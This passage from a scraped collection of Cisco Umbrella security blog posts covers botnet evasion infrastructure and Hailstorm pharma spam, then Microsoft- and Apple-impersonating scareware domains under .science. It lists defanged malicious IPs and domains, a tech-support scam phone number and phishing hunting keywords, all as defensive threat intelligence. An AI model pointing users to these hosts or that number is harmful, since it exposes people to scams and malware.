and use a low TTL, in order to evade detection by continuously moving hosting addresses. The malware will also contact a large set of domains using a Domain Generation Algorithm . The majority of these domain names are not registered and are NXDOMAINs . The actual C2 server used to control the now infected system will be within this large amount of callout requests to the DGA domains making it hard to differentiate. Infected bots can act as proxies between the infected systems and the C2 server. Compromised servers can also add another layer of proxies that the C2 server can attempt to hide behind. Now that the C2 server and attacker are aware of the newly infected bot that has joined the botnet, it moves on to the next stage where the bot will Report & Await Commands . Network communications established with the C2 server can allow it to receive additional commands to carry out and to send stolen information or files to the C2 server. The bandwidth provided by the bot can be used to perform DDoS attacks on a given target. More spam can be sent from capable bots at this time and additional malware will be dropped onto systems which is most typically; Remote Access Trojans, Ransomware, Crypto-Miners and Banking Trojans. The final phase and goal now is to Maintain & Evade Detection to remain part of the botnet. Malware will use techniques to gain persistence on the system. The rallying techniques of proxy layers, DGAs, and domain and IP fast flux will continue. Why Should We Research the Infrastructure Behind Botnets? We research the infrastructure that is behind these botnets in order to help stop many cyber crimes. Botnets are a particularly hard problem to solve since there are millions of infected systems all over the globe, and not one central node or host. Infected systems often go unnoticed and participate within a botnet undetected by users or companies. These systems can be leaking private information for years and also providing bandwidth that furthers cyber crimes. The cheap price (within $10) that a bot can be rented or a malware payload can be distributed, also accelerates the proliferation of botnets. Spam and Pharma Fraud We’ve been monitoring spam sent in the form of Russian sponsored Canadian pharma fraud (My Canadian Pharmacy) in notable instances on the Necurs botnet. This has surfaced on most likely compromised hosts used in the spread of Hailstorm spam. Associated hosts have been identified by SpamHaus as connected to the criminal spam organization Yambo Financials . These spam messages go beyond the pushing of fake pharmaceuticals. The spam messages have spread ransomware such as Locky through malicious attachments. Malware is used that turn systems into spambots, sending out even more unwanted email messages. Links included within the messages have also included URLs leading to fake Russian dating sites. IOCs Hailstorm spam IPs. The spam campaigns have rotated over time. The latest has been My Canadian Pharmacy. 95.31.22[.]193 185.90.61[.]36 185.90.61[.]37 62.112.8[.]34 87.229.111[.]163 188.126.94[.]79 82.118.242[.]158 217.195.60[.]211 84.124.94[.]11 At Cisco Umbrella we will continue to investigate these types of attacks and reveal the hidden infrastructure behind the botnets that fuel today’s cyber crimes.", "date": "2017-09-19"},
{"website": "Cisco-Umbrella", "title": "You Know, for Science", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/you-know-science", "abstract": "In December 2016 , Cisco Umbrella released a new security category called “Newly Seen Domains”. This category identifies domains that have been queried for the first time by customers of Cisco Umbrella. The Security Research team has been developing new classifiers that can make malicious convictions on these newly seen domains. We’ve also been engaging in some simple threat hunting techniques. One technique is to search the list of newly seen domain names for a combination of specific keywords. In particular, keywords often used in phishing and scareware domain names. For example; verify, security, account, login, apple, office365, alert, virus, google, microsoft. This blog post will highlight a subset of scareware domains found through one of our threat hunting exercises. Scareware at .science Scareware is a domain or malicious software that tricks users into believing their computer is infected with malware and sells fake antivirus software or technical support to remove it. These type of domains often impersonate well known companies, like Microsoft. A large amount of scareware domains impersonating Microsoft were newly seen within the past couple of days from the .science gTLD . We’re going to look closer at one of these domains and will provide a full list of domains at the end of the post. A large amount of them will display the same fake Microsoft page if you use the URI /ow/en/ with the domain name. http://security[.]microsoft[.]com[.]jfjaky[.]brightloyaltroutofenergy[.]science/ow/en/ After clicking “Continue” an animation loads that is pretending to scan your system. The results always tell you that your system is infected with ransomware. After clicking on “Download and Repair Windows” you’re instructed on how to install the software. When I reviewed these domains, the location they were using to host the executable did not deliver the download and responded with a 400-bad request. So, I decided to check out the domain they were using throughout their html source to host their images; globalsystools[.]com and was able to download the executable. Here is a screenshot of the software running on a virtual machine. Simply doing a Google search on the phone number displayed, 1-855-332-0124, reveals that it is well known and associated with tech support scams. In case you’re curious, here’s a look at what happened to the CPU usage on my virtual machine after installing this software. Don’t Take the Bait If a company is using these types of lies, impersonations and scareware tactics to frighten people into installing their software, you should stay away. Tech support scams thrive on this type of impersonation, tricking the person into believing they’re seeking help from a reputable trusted company. Let’s look at the structure of one of these domain names. http:// security.apple.com.abwxfmcxp. prehistorichelpfulmillipedeofsuccess[.]science “ security.apple.com.abwxfmcxp ” are subdomains on the parent domain prehistorichelpfulmillipedeofsuccess[.]science .science is the gTLD When you visit the above URL, you’re visiting a subdomain of the domain name prehistorichelpfulmillipedeofsuccess[.]science. It may appear that the subdomains form a legitimate domain name “security.apple.com” but that is only done to trick people into taking the bait. Be sure to always check hostnames down to their TLD , or in this case, the gTLD being .science. At Cisco Umbrella, we’re continually working against malicious actors to protect our customers.  Our Security Research team uses many methods to stay ahead of attacks from algorithmic classification techniques to threat hunting for specific attack trends. Scareware .science domains: security.apple.com.abwxfmcxp.prehistorichelpfulmillipedeofsuccess[.]science security.apple.com.adyudcuae.fineweaselofmajorinfluence[.]science security.apple.com.aqxqqkyn.provocativemindfulkittiwakeofteaching[.]science security.apple.com.bkqzknz.cuterobuststallionofbrotherhood[.]science security.apple.com.bmtqdrjbkk.elatedurbanearwigofexercise[.]science security.apple.com.bsvclbypv.brightloyaltroutofenergy[.]science security.apple.com.ctbuyz.outrageousmuscularoxpeckerfromvenus[.]science security.apple.com.drevspdpjc.outrageousmuscularoxpeckerfromvenus[.]science security.apple.com.erthx.hospitablerousingdugongofacumen[.]science security.apple.com.etouw.hospitablerousingdugongofacumen[.]science security.apple.com.fjeryuzbwpw.fineweaselofmajorinfluence[.]science security.apple.com.fnizlv.fortunatescrupulouspythonofeffort[.]science security.apple.com.fqnpfativv.fortunatescrupulouspythonofeffort[.]science security.apple.com.gdwmqsmiie.provocativemindfulkittiwakeofteaching[.]science security.apple.com.hbdkvpb.brightloyaltroutofenergy[.]science security.apple.com.hjjkjb.prehistorichelpfulmillipedeofsuccess[.]science security.apple.com.hlhoy.fineweaselofmajorinfluence[.]science security.apple.com.hwujcl.hospitablerousingdugongofacumen[.]science security.apple.com.ifcdpdkuu.cuterobuststallionofbrotherhood[.]science security.apple.com.ixbdzvs.hypnoticflawlesshornetofeducation[.]science security.apple.com.jizsindate.hypnoticflawlesshornetofeducation[.]science security.apple.com.jlyyr.fineweaselofmajorinfluence[.]science security.apple.com.lsujjp.cuterobuststallionofbrotherhood[.]science security.apple.com.luzxwkkd.hypnoticflawlesshornetofeducation[.]science security.apple.com.lxraws.hospitablerousingdugongofacumen[.]science security.apple.com.mheltrsefo.hypnoticflawlesshornetofeducation[.]science security.apple.com.mmlhkj.zippybananamantisofmerriment[.]science security.apple.com.mostbknp.prehistorichelpfulmillipedeofsuccess[.]science security.apple.com.nbrepqwp.outrageousmuscularoxpeckerfromvenus[.]science security.apple.com.nlqavnjoh.prehistorichelpfulmillipedeofsuccess[.]science security.apple.com.nolsesjp.fineweaselofmajorinfluence[.]science security.apple.com.onuvfrdu.hospitablerousingdugongofacumen[.]science security.apple.com.oqbtzqy.provocativemindfulkittiwakeofteaching[.]science security.apple.com.otbmgbtude.hospitablerousingdugongofacumen[.]science security.apple.com.otlwnof.hypnoticflawlesshornetofeducation[.]science security.apple.com.pfmntiegue.zippybananamantisofmerriment[.]science security.apple.com.pfvsatlr.cuterobuststallionofbrotherhood[.]science security.apple.com.pryjozhhwy.hospitablerousingdugongofacumen[.]science security.apple.com.puziy.brightloyaltroutofenergy[.]science security.apple.com.reibkrrgiz.fineweaselofmajorinfluence[.]science security.apple.com.sfvfkrmm.brightloyaltroutofenergy[.]science security.apple.com.shmhvrtmsy.hospitablerousingdugongofacumen[.]science security.apple.com.sjgkxvlgsp.prehistorichelpfulmillipedeofsuccess[.]science security.apple.com.ssunzxztgoo.provocativemindfulkittiwakeofteaching[.]science security.apple.com.swhuxuxf.provocativemindfulkittiwakeofteaching[.]science security.apple.com.tbcaquciks.provocativemindfulkittiwakeofteaching[.]science security.apple.com.uwjkbbzrg.fineweaselofmajorinfluence[.]science security.apple.com.vpnwd.prehistorichelpfulmillipedeofsuccess[.]science security.apple.com.wnirplrk.provocativemindfulkittiwakeofteaching[.]science security.apple.com.wrdeymepqlu.outrageousmuscularoxpeckerfromvenus[.]science security.apple.com.xagzsy.fortunatescrupulouspythonofeffort[.]science security.apple.com.xbxos.importedfunkychipmunkofanger[.]science security.apple.com.xgisckgbozs.hypnoticflawlesshornetofeducation[.]science security.apple.com.xhbhtqtg.elatedurbanearwigofexercise[.]science security.apple.com.xibbfw.outrageousmuscularoxpeckerfromvenus[.]science security.apple.com.zdpazljrdta.hypnoticflawlesshornetofeducation[.]science security.microsoft.com.anupvbmd.outrageousmuscularoxpeckerfromvenus[.]science security.microsoft.com.bgkljlk.brightloyaltroutofenergy[.]science security.microsoft.com.civtl.fortunatescrupulouspythonofeffort[.]science security.microsoft.com.cnrihjfpfa.zippybananamantisofmerriment[.]science security.microsoft.com.dwiopejz.hypnoticflawlesshornetofeducation[.]science security.microsoft.com.ehezmg.brightloyaltroutofenergy[.]science security.microsoft.com.eivru.cuterobuststallionofbrotherhood[.]science security.microsoft.com.eoecxxzkwy.brightloyaltroutofenergy[.]science security.microsoft.com.epvdser.hospitablerousingdugongofacumen[.]science security.microsoft.com.fbximggl.hypnoticflawlesshornetofeducation[.]science security.microsoft.com.geasgbuu.cuterobuststallionofbrotherhood[.]science security.microsoft.com.goewrmp.hospitablerousingdugongofacumen[.]science security.microsoft.com.gprfm.zippybananamantisofmerriment[.]science security.microsoft.com.gqzvaa.outrageousvenomoussawflyofenthusiasm[.]science security.microsoft.com.gzajkf.prehistorichelpfulmillipedeofsuccess[.]science security.microsoft.com.gzqygkx.brightloyaltroutofenergy[.]science security.microsoft.com.igaaiahtg.provocativemindfulkittiwakeofteaching[.]science security.microsoft.com.imwyquutds.outrageousmuscularoxpeckerfromvenus[.]science security.microsoft.com.iozqitj.brightloyaltroutofenergy[.]science security.microsoft.com.iqptmrzhrj.zippybananamantisofmerriment[.]science security.microsoft.com.iuvtfsup.fineweaselofmajorinfluence[.]science security.microsoft.com.jdrrxwhqsx.zippybananamantisofmerriment[.]science security.microsoft.com.jfjaky.brightloyaltroutofenergy[.]science security.microsoft.com.jqvrkuhcq.provocativemindfulkittiwakeofteaching[.]science security.microsoft.com.jubwmpg.prehistorichelpfulmillipedeofsuccess[.]science security.microsoft.com.jzxsayc.zippybananamantisofmerriment[.]science security.microsoft.com.kyrjzeblh.hospitablerousingdugongofacumen[.]science security.microsoft.com.kyxpk.elatedurbanearwigofexercise[.]science security.microsoft.com.ldnckbdh.zippybananamantisofmerriment[.]science security.microsoft.com.lisoarx.hypnoticflawlesshornetofeducation[.]science security.microsoft.com.lwbgk.zippybananamantisofmerriment[.]science security.microsoft.com.lxhot.provocativemindfulkittiwakeofteaching[.]science security.microsoft.com.mehjervjgwn.hypnoticflawlesshornetofeducation[.]science security.microsoft.com.mjuwpxddbm.elatedurbanearwigofexercise[.]science security.microsoft.com.mrjnb.stylishvoraciousiguanaofromance[.]science security.microsoft.com.muwciv.hospitablerousingdugongofacumen[.]science security.microsoft.com.mxkakvl.hospitablerousingdugongofacumen[.]science security.microsoft.com.nclkgzsxbs.provocativemindfulkittiwakeofteaching[.]science security.microsoft.com.oajlkumfv.fortunatescrupulouspythonofeffort[.]science security.microsoft.com.ofimeyovg.brightloyaltroutofenergy[.]science security.microsoft.com.ogsfrjbeoqb.zippybananamantisofmerriment[.]science security.microsoft.com.oogjjknpjm.provocativemindfulkittiwakeofteaching[.]science security.microsoft.com.pbwdrqlkgl.hospitablerousingdugongofacumen[.]science security.microsoft.com.pftrsscvu.fortunatescrupulouspythonofeffort[.]science security.microsoft.com.pioxrjnjycs.outrageousmuscularoxpeckerfromvenus[.]science security.microsoft.com.pmdgwwjrrcj.elatedurbanearwigofexercise[.]science security.microsoft.com.puvdcz.prehistorichelpfulmillipedeofsuccess[.]science security.microsoft.com.pxyefct.provocativemindfulkittiwakeofteaching[.]science security.microsoft.com.qrhqfr.fortunatescrupulouspythonofeffort[.]science security.microsoft.com.reokwd.brightloyaltroutofenergy[.]science security.microsoft.com.rkvsfv.outrageousmuscularoxpeckerfromvenus[.]science security.microsoft.com.roknlrvgm.zippybananamantisofmerriment[.]science security.microsoft.com.rtmtlngul.brightloyaltroutofenergy[.]science security.microsoft.com.slhyn.fineweaselofmajorinfluence[.]science security.microsoft.com.snaire.prehistorichelpfulmillipedeofsuccess[.]science security.microsoft.com.spktyaegwts.zippybananamantisofmerriment[.]science security.microsoft.com.tanbzwvzy.hypnoticflawlesshornetofeducation[.]science security.microsoft.com.tmehevnn.hospitablerousingdugongofacumen[.]science security.microsoft.com.tvhznnq.brightloyaltroutofenergy[.]science security.microsoft.com.udgtg.fortunatescrupulouspythonofeffort[.]science security.microsoft.com.udpeda.zippybananamantisofmerriment[.]science security.microsoft.com.ukzilncqw.fineweaselofmajorinfluence[.]science security.microsoft.com.umpcu.hospitablerousingdugongofacumen[.]science security.microsoft.com.uvguuhcxobh.provocativemindfulkittiwakeofteaching[.]science security.microsoft.com.vqnjqtnc.prehistorichelpfulmillipedeofsuccess[.]science security.microsoft.com.vrqluu.hospitablerousingdugongofacumen[.]science security.microsoft.com.wdwhnhw.prehistorichelpfulmillipedeofsuccess[.]science security.microsoft.com.weplokyf.hospitablerousingdugongofacumen[.]science security.microsoft.com.xorbcz.zippybananamantisofmerriment[.]science security.microsoft.com.ykwrsc.outrageousmuscularoxpeckerfromvenus[.]science security.microsoft.com.yogseycixas.fortunatescrupulouspythonofeffort[.]science security.microsoft.com.ysfqmogqzho.fortunatescrupulouspythonofeffort[.]science security.microsoft.com.ywfmassrron.hypnoticflawlesshornetofeducation[.]science security.microsoft.com.zdjnc.cuterobuststallionofbrotherhood[.]science security.microsoft.com.zfaaonnk.outrageousmuscularoxpeckerfromvenus[.]science security.microsoft.com.zgijsg.elatedurbanearwigofexercise[.]science security.microsoft.com.zmjajstvmid.hypnoticflawlesshornetofeducation[.]science security.microsoft.com.znxfmr.elatedurbanearwigofexercise[.]science security.microsoft.com.zpuszjzw.hospitablerousingdugongofacumen[.]science The hosting IP of the domains, showing many more seen by Cisco Umbrella’s passive DNS data: 185[.]145[.]129[.]106 View of 185[.]145[.]129[.]106 in Investigate", "date": "2018-03-15"}
]